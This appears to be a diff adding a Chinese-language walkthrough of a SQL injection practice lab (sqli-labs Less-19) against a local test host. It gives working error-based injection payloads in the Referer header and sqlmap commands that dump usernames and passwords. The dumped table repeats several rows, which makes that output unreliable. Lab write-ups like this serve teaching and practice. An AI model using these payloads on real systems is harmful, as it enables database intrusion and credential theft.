@@ -1,0 +1,83 @@
+uname=admin&passwd=123&submit=Submit
+登录成功后会显示Referer
+uname=admin' --+&passwd=123&submit=Submit
+登录失败
+uname=admin" --+&passwd=123&submit=Submit
+登录失败
+uname=admin&passwd=123' --+&submit=Submit
+登录失败
+uname=admin&passwd=123" --+&submit=Submit
+登录失败
+说明对uname和passwd都进行了过滤，故uname和passwd不存在注入点。且只有登录成功后，才能进入处理Referer部分。故注入点在Referer处
+
+方法一：
+1.数据库名
+Referer: http://10.0.2.15/sqli/Less-19/' and updatexml(1,concat(0x7e,(select database()),0x7e),1) or '1' = '1
+2.表名
+Referer: http://10.0.2.15/sqli/Less-19/' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x7e),1) or '1' = '1
+3.字段名
+Referer: http://10.0.2.15/sqli/Less-19/' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name = 'users'),0x7e),1) or '1' = '1
+4.字段值
+Referer: http://10.0.2.15/sqli/Less-19/' and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1) or '1' = '1
+显示不全，利用limit限制范围遍历显示信息。编写脚本
+字段值：
+Dumb:1
+Angelina:1
+Dummy:1
+secure:1
+stupid:1
+superman:1
+batman:1
+admin:123
+admin1:1
+admin2:1
+admin3:1
+dhakkan:1
+admin4:1
+
+方法二：
+把raw.txt中Referer参数改为*，即：
+Referer: *
+sqlmap -r raw.txt --batch --technique E --current-db
+current database: 'security'
+sqlmap -r raw.txt --batch --technique E -D security --tables
+Database: security
+[4 tables]
++----------+
+| emails   |
+| referers |
+| uagents  |
+| users    |
++----------+
+sqlmap -r raw.txt --batch --technique E -D security -T users --columns
+Database: security
+Table: users
+[3 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| id       | int(3)      |
+| password | varchar(20) |
+| username | varchar(20) |
++----------+-------------+
+sqlmap -r raw.txt --batch --technique E -D security -T users -C username,password --dump
+Database: security
+Table: users
+[13 entries]
++----------+----------+
+| username | password |
++----------+----------+
+| admin4   | 1        |
+| Angelina | 1        |
+| Dummy    | 1        |
+| secure   | 1        |
+| stupid   | 1        |
+| superman | 1        |
+| batman   | 1        |
+| admin4   | 1        |
+| Angelina | 1        |
+| Angelina | 1        |
+| Angelina | 1        |
+| admin4   | 1        |
+| admin    | 123      |
++----------+----------+
